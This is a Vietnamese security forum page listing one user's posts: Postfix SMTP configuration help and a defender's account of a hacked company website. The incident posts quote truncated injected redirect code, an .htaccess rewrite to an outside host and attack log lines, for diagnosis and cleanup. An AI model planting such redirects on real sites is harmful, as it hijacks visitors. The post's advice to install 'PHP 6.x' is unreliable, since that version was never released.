<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by KenshinIT, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by KenshinIT - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.hva?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.hva">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.hva">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.hva">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.hva">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.hva">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.hva"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.hva">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.hva">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.hva">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.hva', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/171467.hva" name="top" class="maintitle" id="top">Messages posted by: KenshinIT</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/171467.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/171467.hva">Profile for KenshinIT</a> 
            			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/171467.hva">Messages posted by KenshinIT</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">1</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.hva">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/37440.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/37440/230438.hva#230438,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Tốt nhất theo mình bây giờ bạn nên cài ở một Sever mới chỉ 2 thứ Postfix + MySQL, configure nó để có thể tạo được nhiều Domain, users cho mỗi Domain.<br/><br/> Xem nó thành công hay không bằng cách xem log file, xem cấu trúc thư mục đã xuất hiện directory của users đó chưa (phải gửi email thì dicrectory của user mới được tạo nha)<br/><br/> Chúng ta đang tập trung vào vấn đề làm thế nào để tạo nhiều virtual domains và users cho các domains đó.Khi thành công hãy tính tới Pop/Imap sever, và Postfix Admin cũng như Squirrel.<br/><br/> Bạn cũng có 1 thể post log file cũng như configure file lên đây để mình xem.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.hva">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/37440.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/37440/230422.hva#230422,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Để giải quyết cho câu hỏi này, trước hết bạn hãy đoc thất kĩ lại Documentation của Postfix đi đã. Các walk through về cài đặt Posfix + MySQL cho vỉtual domain là rất nhiều. Dovecot/Courier hay bất kì một cái nào khác chỉ dùng để pop mail giữa client và Postfix thôi, nó không dính nhiều tới việc <blockquote>có thể tạo ra nhiều account email với nhiều domain khác nhau không sử dụng user hệ thống&nbsp;
</blockquote>.<br/><br/> <blockquote>Làm thế nào để có thể tạo ra nhiều account email với nhiều domain khác nhau không sử dụng user hệ thống. Trong khi domain chỉ được gán vào VirtualHost của Apache thông qua webmin. &nbsp;
</blockquote>Giờ bạn thử cài Postfix + MySQL + PostFix Admin để giải quyết vấn đề của bạn nhé<br/><br/> Sau khi thành công hãy tính tới viêc sử dụng Dovecot hay Courier hay 1 cái nào khác để làm Pop/Imap server<br/><br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.hva">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/37343.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/37343/230380.hva#230380,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">thuannghich wrote:</cite><br>
<blockquote>em chào các bác!<br/> em đang tìm hiểu về mail posfix.<br/> em có 1 vấn đề muốn hỏi các bác!<br/><br/> em đọc trong link<br/><span class="link"> http://www.hvaonline.net/hvaonline/posts/list/15/25922.hva</span><br/> có 1 đoạn bác :myquartz viết<br/> <blockquote><br/> II - SMTPD: reject when not logged in: cái này mô tả rất dễ.<br/> Ví dụ server của công ty abc.com, nhận và gửi mail (tức là mail relay kiêm mail host). Giả thiết ta có 1 user là <a href="mailto:john@abc.com">john@abc.com</a>.<br/> 1. <a href="mailto:john@abc.com">john@abc.com</a> muốn gửi mail cho ai đó, ví dụ <a href="mailto<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">x@yahoo.com&quot;&gt;xx@yahoo.com</a>&quot;&gt;xxx@yahoo.com,<br/> thì phải xác thực trước, kiểu như: AUTH LOGIN john, .. MAIL FROM: &lt;john@abc.com&gt;, RCPT TO: &lt;xxx@yahoo.com&gt;.<br/> Nếu không xác thực thì sẽ không cho gửi đi, server sẽ báo là not allow to relay. Cái này MTA nào cũng có. &nbsp;
</blockquote><br/><br/> vậy các bác cho em hỏi<br/> em cần phải cấu hình gì ở file : /etc/postfix/main.cf<br/> để làm mail server em làm đựoc điều trên !<br/> chứ nếu không.<br/> theo mặc định, SMTP server sẽ nhận hết tất cả các kết nối gửi mail đến nó. Nếu vậy sẽ có hiện tượng giả danh để send mail!<br/> mong ý kiến của các bác&nbsp;
</blockquote><br/><br/> Bạn đọc tutorials của Postfix chưa? Bạn hiểu như thế nào về Authenticated của SMTP, đã configure được gì rồi, log file show ra cái gì?<br/><br/> <blockquote>mình đã thử :<br/><br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>mynetworks = 127.0.0.0/8
smtpd_sasl_auth_enable = yes
smtpd_recipient_restrictions = permit_mynetworks,
permit_sasl_authenticated, reject_unauth_destination
broken_sasl_auth_clients = yes</pre>
</div><br/><br/> nhưng ko có tác dụng!<br/> mong các bác giúp đỡ&nbsp;
</blockquote><br/><br/> Có vẻ bạn chưa modify 1 vài comment cần thiết trong file master.cf. Bạn thử xem qua các comment về SMTPD trong master.cf xem mình còn thiếu hay sai sót cái gì mà nó chưa chạy.<br/><br/> Cái vấn đề bạn nói xác thực đúng người gửi có exist trong domamin thì bạn có thể xem thêm cái này: <span class="link"> http://www.postfix.org/ADDRESS_VERIFICATION_README.html</span><br/><br/> Thân<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/36841.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/36841/226777.hva#226777,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">conmale wrote:</cite><br>
<blockquote><br/> Bồ đưa ra logs với các POST requests đến các php files có HTTP status là 200 và đồng thời lại khẳng định là bồ đã xoá hết chỉ để lại mỗi index.php. Xét về mặt kỹ thuật, đây là điều không thể xảy ra. Xét về mặt lý luận và phân tích, bồ đưa logs của trường hợp này vào trường hợp kia như vậy chỉ làm rối rắm thêm mà thôi. Nó không phải để focus mà theo tôi, đó chỉ tạo ngộ nhận và phức tạp hoá vấn đề.&nbsp;
</blockquote><br/><br/> Sorry nếu vô tình gây rối rắm cho anh em.<br/><br/> Để tôi giải thích lại cho rõ ràng để anh em và bro commale hiểu nhé.<br/><br/> 1. Đầu tiên, các website sử dụng Framework của Joomla, Drupal, Wordpress sẽ bị 1 đợt reconnaissance (cũng có thể gọi là attack, nhưng vì tôi thấy những đợt sau nghiêm trọng hơn nên mình nghĩ nó chỉ là 1 đợt thăm dò thôi). Các website này sẽ truy cập direct được bình thường, nhưng sẽ bị wwwect đến trang p3p0.com khi truy cập từ kết quả search của Google, Ping, YH,....<br/><br/> Sau khi xoá các đoạn code bắt đầu bằng "<b>eval(</b>" thì web trở lại bình thường.<br/><br/> 2. Chưa đầy 1 tuần thì website bị sập. Xoá hết, tạo mới 1 file index.php để thông báo web đang maintained thì vẫn sập. Vào xem thì thấy file index bị "tiêm" 1 đoạn code lạ, khác với code của đợt 1.<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;script type='text Javascript'&gt;document.location.href='http://.....</pre>
</div><br/><br/> Vào xem log của Apache thì thấy rất nhiều Http post đến các file php khác , cụ thể như sau: common.php, main.php, phpMyadmin/scripts/setup.php, /mysql/, /mysql/db/. và dĩ nhiên là post này bị failed<br/><br/> Restore lại backup gần nhất, xoá và cài lại bộ Apache-MySQL-PHP, fix 1 vài chỗ, thì tạm ổn.<br/><br/> 3. Đang chờ xem tình hình thế nào, sau vài ngày thì vẫn đang ổn. Vào thăm logs của Apache thì thấy những logs thông báo có người đang cố gắng http post vào các file php như cũ, không thấy thay đổi gì lạ trong nội dung những file ấy nhưng http post status là 200 ( điều này hiển nhiên như bro commale nói, vì nó đang available mà <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"> )<br/><br/><br/> Tôi đưa đoạn logs đó lên chắc làm nhầm với trường hợp 2, sorry.<br/><br/> HIện giờ chưa dàm khẳng định gì nhiều, chỉ dám nói nêu ra vài điều sau:<br/> + Trường hợp 1 thì được đặt tên chung là "p3p0 hijacking". Giải pháp là xoá đoạn code "eval" trong các file php, đa số sẽ nằm trong includes/defines.php, common.php, index.php, etc.. Sau đó xoá ngay back door là file "/includes/post.php"<br/><br/> + Trường hợp 2, có vẻ như là 1 vulnerability của phpMyadmin, một số người sử dụng 1 phpMyAdmin kèm theo Apache-MySQL-PHP thì sẽ bị, nó sẽ tấn công thông qua<b> setup.php</b> nằm trong <b>phpMyadmin/scripts/setup</b> và 1 số file khác. Và nó sẽ tự tạo file .httpaccess với nội dung<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>RewriteEngine On
RewriteBase /
RewriteRule ^&#40;.*&#41;?<span class="link"> http://...</span></pre>
</div><br/><br/> Giải pháp là restore lại clean backup gần nhất, xoá hẳn nguyên thư mục phpMyadmin đi (cái này sẽ khó khăn cho những ai làm việc với MySQL bằng GUI). Nếu được thì nên cài PHP 6.x thay cho 5.x.<br/><br/><br/> Nếu có gì thắc mác hay cần logs cụ thể thì anh em cứa request nhé. Commale còn gì thắc mắc nữa hem <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"> Sorry, câu cú và cách trình bày hơi lộn xộn. Chủ yếu muốn đóng góp và share kinh nghiệm cho anh em thôi. <img src="/hvaonline/images/smilies/bde7cf9049e122a728d29f2213bb2b67.gif" border="0" alt="smilie" align="absbottom"><br/><br/><br/> P/S: Cái này ngoài lề tí, sao dạo này Hva không sôi nổi như hồi trước nữa nhỉ. Tiếc là tôi không biết sớm về đợt tuyển Mod, hem là cũng thi rồi <img src="/hvaonline/images/smilies/274a01ad7ad7ad7d73d5f0b399ae5db2.gif" border="0" alt="smilie" align="absbottom"> Tôi có 1 ý này hy vọng giúp Hva sôi động lại như ngày trước. Chúng ta sẽ tổ chức cuộc thi hàng tháng, hàng quý. Thể thức thì các Mod quyết định nhé. Nếu được mình xin làm sponsors , không nhiều nhưng hy vọng là đủ để lên tinh thần cho anh em.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/36841.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/36841/226726.hva#226726,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">conmale wrote:</cite><br>
<blockquote><br/><br/><br/> Đoạn màu đỏ khá phi lý. Nếu trên trang web ấy <font color='red'>chỉ tồn tại có mỗi index.php</font> thì tất cả những request không đến index.php bắt buộc phải có HTTP 404 error (not found). Ví dụ, request đến /howwework-open.php phải có status là 404.&nbsp;
</blockquote><br/><br/> Rất chính xác. Có rất nhiều là đằng khác, tại tôi chỉ point out 1 vài log mà mình muốn focus cho anh em thôi.<br/><br/> Nói chung là nó chơi kiểu wide attack, dò và adapt 1-2 đoạn script vào tất cả các file php mà 1 trang web thông thường sẽ có, nào là index.php, main.php, common.php, phpMyadmin/scripts/setup.php, includes/post.php, etc....<br/><br/> Để sever thực sự đứng vững trước các đợt attack này xong, tôi sẽ post rõ ràng các log file, tình trạng cũng như cách khắc phục cho anh em ngâm cứu.<br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/36841.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/36841/226701.hva#226701,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Nếu như vậy thì không phải đau đầu nhiều đâu bro. Đằng này, tôi đã xoá hết web folder rồi. Chỉ tạo mới 1 cái index.php để thông báo thôi. Kết quả thì bro biết rồi đấy <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"><br/><br/> Tình hình là bữa giờ server tạm ok. Vẫn có nhiều đợt attack vào theo kiểu cũ, nhưng do tôi đã vá lại rồi, nên cũng ko sao. Để vài hôm nữa xem thến nào rồi sẽ đưa ra kết kuận chính thức cho việc này<br/><br/> Thanks all & Best Regards.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/36841.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/36841/226641.hva#226641,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">conmale wrote:</cite><br>
<blockquote><br/><br/> - Thứ nhất, với HTTP status 200 của 4 request trên chứng tỏ những php file ấy tồn tại.<br/><br/> - Thứ nhì, những fles đó nằm ngay "context" root (/). Điều này có nghĩa những file ấy tồn tại để cho mọi người có thể access. Nếu không thì access đến những php đó sẽ đòi hỏi authentication rồi sau đó mới thực hiện chuyện gì đó sau. Bởi thế, việc access đến các php ấy có HTTP status 200 (để đi tới bước authentication) là chuyện bình thường. Bồ nên xác nhận các php đó available cho mọi người access hay không?<br/><br/> - Thứ ba, log format của các log trên thuộc dạng đơn giản nên không ghi nhận kích thước của các "POST". Bởi vậy, khó xác định được những request ấy là "tấn công" hay sử dụng bình thường.<br/><br/> - Thứ tư, nếu không nắm được chức năng và cấu trúc của web application của bồ thì khó lòng mà đoán được chuyện gì xảy ra với vỏn vẹn 4 dòng log ngắn gọn như trên.&nbsp;
</blockquote><br/><br/> Hi commale,<br/><br/> Tôi cũng biết là những file này tồn tại, và available to access (Get/Head) nhưng không cho Modify (Post). Vấn đề bồ đặt ra khá đúng: Tại sao biết những đây là những đợt attack từ những log file khá đơn giản như vậy?<br/><br/> Bởi vì, như tôi đã nêu ở phần đầu của Topic, đó là Website đã bị attack/hack 1 lần rồi, trước đó chỉ vài ngày. Và hầu hết các file php đều bị Post 1 đoạn script lạ để Redirect đến "p3p0.com". Kế nữa, những IP thực hiện việc Post này không phải IP của người được giao nhiệm vụ Update website. Tôi đã kêu người đó thử Post và so sánh thì IP hoàn toàn khác nhau. Và nếu dùng 1 số phuơng pháp Trace thì có thể thấy 1 số IP được đưa ra trong log file trên đa số xuất phát từ nước ngoài ( Panama, Euro), chỉ khoảng 2-3 IP là từ Việt Nam.<br/><br/> Do đó, đến đây tôi có thể nói (chỉ theo ý tôi thôi nhé ) là website tiếp tục bị Hack/attack. Thêm 1 bằng chứng nữa. Khi tôi để 1 file index.php rất đơn giàn, chỉ print 1 câu thông báo là sever đang maintained thì vẫn bị Post vào 1 dòng script lạ .<br/><br/> Nếu ở trường hợp khác thì chắc chắn sẽ phải xem xét kĩ lại rồi mới dám đưa ra giả thuyết. Nhưng vì đặc thù của trang Web chỉ là show ra info và image về cty. Không cho comment hay post lên đó gì cả, và vì mới bị dính 1 đợt reconnaissance trước đó nên mình có thể đoán ra.<br/><br/> Tôi đang cố gắng đưa vài cái .cap và toàn bộ log file nghi vấn lên đây cho anh em tham khảo chung luôn. Nhưng hiện giờ hơi bận.<br/><br/> Sẽ update tình hình cho anh em liên tục.<br/><br/> Thanks & Best Regards</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/36841.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/36841/226488.hva#226488,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">News......<br/><br/> Đã có vô vàn đợt attack tiếp thep. Tôi sẽ đưa ra log cho anh em tham khảo sau. Nhưng bây giờ mình thảo luận 1 tí. Đây có phải là 1 loại attack ko?<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>58.186.220.205 - - &#91;06/Dec/2010:15:16:28 +0700&#93; "POST /howwework-open.php HTTP/1.1" 200 898
113.22.168.141 - - &#91;06/Dec/2010:16:31:56 +0700&#93; "POST /contact.php HTTP/1.1" 200 2337
113.161.74.114 - - &#91;06/Dec/2010:14:56:28 +0700&#93; "POST /howwework-strong.php HTTP/1.1" 200 2523
58.186.119.175 - - &#91;06/Dec/2010:14:45:02 +0700&#93; "POST /portfolio.php HTTP/1.1" 200 1920</pre>
</div><br/><br/> Sau đây là những yếu tố để xét xem có phải là attack ko:<br/><br/> 1. Web của công ty là web bình thường, không có forum gì cả, cũng không cho khả năng modify nội dung.<br/><br/> 2. Người có thể Modify nội dung thì ngồi trong công ty, sử dụng "cms" có sẵn của website. Nhưng những ip trên không thuộc range IP mà công ty đang thuê.<br/><br/> 3. Những file mà IP trên cố gắng post vào đều chẳng phải những file cần update. Công ty chỉ update Images là đa số.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/36841.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/36841/226440.hva#226440,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">xnohat wrote:</cite><br>
